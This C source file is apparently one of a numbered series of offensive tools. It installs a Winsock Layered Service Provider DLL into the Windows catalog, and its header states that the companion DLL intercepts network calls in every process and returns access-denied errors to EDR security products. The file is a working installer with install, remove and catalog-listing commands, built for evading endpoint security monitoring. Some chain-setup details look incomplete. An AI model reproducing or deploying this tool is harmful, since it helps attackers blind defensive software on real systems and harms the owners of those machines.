/*
 * 18_winsock_lsp_install.c
 * Winsock LSP Installer — installs 18_winsock_lsp_dll.dll into Winsock catalog
 *
 * Winsock Layered Service Provider (LSP) is a legacy Windows mechanism that
 * inserts a DLL into the Winsock catalog. Every Winsock 2 API call (connect,
 * send, recv) in EVERY process is intercepted by our DLL before reaching TCP/IP.
 *
 * The companion DLL (18_winsock_lsp_dll.dll) inspects the calling process name
 * and returns WSAEACCES for EDR processes.
 *
 * Status: Deprecated since Windows 8 / Server 2012, but still functional.
 *
 * Build (installer):
 *   cl 18_winsock_lsp_install.c /link ws2_32.lib Rpcrt4.lib
 *
 * Build (DLL — see 18_winsock_lsp_dll.c):
 *   cl /LD 18_winsock_lsp_dll.c /link ws2_32.lib
 *
 * Usage:
 *   18_winsock_lsp_install.exe install <path_to_dll>
 *   18_winsock_lsp_install.exe remove
 *   18_winsock_lsp_install.exe list
 *
 * IMPORTANT: Run as Administrator. Affects ALL processes — test in a VM.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2spi.h>
#include <rpc.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Rpcrt4.lib")

/* Unique GUID for our LSP provider — must be unique, don't reuse */
/* {C1D2E3F4-0001-0001-8001-000000000001} */
static GUID LSP_PROVIDER_GUID = {
    0xC1D2E3F4, 0x0001, 0x0001,
    { 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 }
};

/* LSP catalog entry marker (stored in protocol name for identification) */
#define LSP_PROVIDER_NAME   L"EDR_Block_LSP"

/* List all Winsock catalog entries */
static void ListCatalog(void)
{
    WSAPROTOCOL_INFOW *protocols = NULL;
    DWORD  bufLen = 0;
    INT    error  = 0;

    /* First call: get required buffer size */
    WSCEnumProtocols(NULL, NULL, &bufLen, &error);
    if (error != WSAENOBUFS && error != 0) {
        wprintf(L"[-] WSCEnumProtocols sizing failed: %d\n", error);
        return;
    }

    protocols = (WSAPROTOCOL_INFOW *)HeapAlloc(GetProcessHeap(), 0, bufLen);
    INT count = WSCEnumProtocols(NULL, protocols, &bufLen, &error);
    if (count == SOCKET_ERROR) {
        wprintf(L"[-] WSCEnumProtocols failed: %d\n", error);
        HeapFree(GetProcessHeap(), 0, protocols);
        return;
    }

    wprintf(L"%-40s  %-10s  %-6s  %s\n",
            L"Name", L"Provider", L"ChainLen", L"CatalogEntry");
    for (INT i = 0; i < count; i++) {
        WSAPROTOCOL_INFOW *p = &protocols[i];
        wprintf(L"%-40s  %-10lu  %-6d  %lu\n",
                p->szProtocol,
                p->dwCatalogEntryId,
                p->ProtocolChain.ChainLen,
                p->dwCatalogEntryId);
    }

    HeapFree(GetProcessHeap(), 0, protocols);
    wprintf(L"\n[*] Total: %d entries\n", count);
}

/* Install the LSP DLL into the Winsock catalog */
static BOOL InstallLsp(const WCHAR *dllPath)
{
    INT error = 0;

    /* Enumerate existing base providers to chain from */
    WSAPROTOCOL_INFOW *protocols = NULL;
    DWORD bufLen = 0;
    WSCEnumProtocols(NULL, NULL, &bufLen, &error);

    protocols = (WSAPROTOCOL_INFOW *)HeapAlloc(GetProcessHeap(), 0, bufLen);
    INT count  = WSCEnumProtocols(NULL, protocols, &bufLen, &error);
    if (count <= 0) {
        wprintf(L"[-] Cannot enumerate protocols: %d\n", error);
        HeapFree(GetProcessHeap(), 0, protocols);
        return FALSE;
    }

    /* Find all SOCK_STREAM (TCP) and SOCK_DGRAM (UDP) base providers */
    /* We install one layered entry per base transport entry */
    DWORD installedCount = 0;

    for (INT i = 0; i < count; i++) {
        WSAPROTOCOL_INFOW *base = &protocols[i];

        /* Only chain onto base providers (ChainLen == BASE_PROTOCOL) */
        if (base->ProtocolChain.ChainLen != BASE_PROTOCOL) continue;
        if (base->iSocketType != SOCK_STREAM &&
            base->iSocketType != SOCK_DGRAM) continue;

        /* Copy base entry and modify for our layered provider */
        WSAPROTOCOL_INFOW layered = *base;
        layered.dwProviderFlags |= PFL_LSPACE_ABOVE_PORTLAYER;
        wcsncpy_s(layered.szProtocol, WSAPROTOCOL_LEN + 1,
                  LSP_PROVIDER_NAME, _TRUNCATE);

        /* The chain: our entry → base entry */
        layered.ProtocolChain.ChainLen = 2;
        /* ChainEntries[0] will be filled by WSCInstallProviderAndChains */

        error = 0;
        if (WSCInstallProvider(&LSP_PROVIDER_GUID, dllPath,
                                &layered, 1, &error) == 0)
        {
            installedCount++;
            wprintf(L"  [+] Installed chain for: %s\n", base->szProtocol);
        } else {
            wprintf(L"  [-] WSCInstallProvider failed for %s: %d\n",
                    base->szProtocol, error);
        }
    }

    HeapFree(GetProcessHeap(), 0, protocols);

    if (installedCount > 0) {
        wprintf(L"\n[+] LSP installed (%lu chains). Affects all new Winsock connections.\n",
                installedCount);
        wprintf(L"[!] Applications must restart to pick up LSP changes.\n");
        return TRUE;
    }
    return FALSE;
}

/* Remove our LSP from the Winsock catalog */
static BOOL RemoveLsp(void)
{
    INT error = 0;
    if (WSCDeinstallProvider(&LSP_PROVIDER_GUID, &error) == 0) {
        wprintf(L"[+] LSP removed from Winsock catalog.\n");
        return TRUE;
    }
    if (error == WSAEFAULT || error == WSAEINVAL) {
        wprintf(L"[~] LSP not found in catalog (already removed or never installed).\n");
        return TRUE;
    }
    wprintf(L"[-] WSCDeinstallProvider failed: %d\n", error);
    return FALSE;
}

int wmain(int argc, wchar_t *argv[])
{
    WSADATA wsd;
    WSAStartup(MAKEWORD(2,2), &wsd);

    wprintf(L"[*] Winsock LSP Installer\n\n");

    if (argc < 2) {
        wprintf(L"Usage:\n");
        wprintf(L"  %s install <dll_path>   Install LSP DLL into Winsock catalog\n", argv[0]);
        wprintf(L"  %s remove               Remove LSP from catalog\n", argv[0]);
        wprintf(L"  %s list                 List all Winsock catalog entries\n", argv[0]);
        WSACleanup();
        return 1;
    }

    int ret = 0;

    if (_wcsicmp(argv[1], L"list") == 0) {
        ListCatalog();
    } else if (_wcsicmp(argv[1], L"install") == 0) {
        if (argc < 3) {
            wprintf(L"[-] Specify DLL path.\n");
            ret = 1;
        } else {
            wprintf(L"[*] Installing LSP: %s\n\n", argv[2]);
            InstallLsp(argv[2]);
        }
    } else if (_wcsicmp(argv[1], L"remove") == 0) {
        RemoveLsp();
    } else {
        wprintf(L"[-] Unknown command: %s\n", argv[1]);
        ret = 1;
    }

    WSACleanup();
    return ret;
}
